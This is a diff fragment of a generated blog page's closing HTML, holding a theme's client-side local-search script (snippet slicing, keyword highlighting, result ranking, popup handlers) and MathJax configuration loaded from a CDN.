+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('3');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
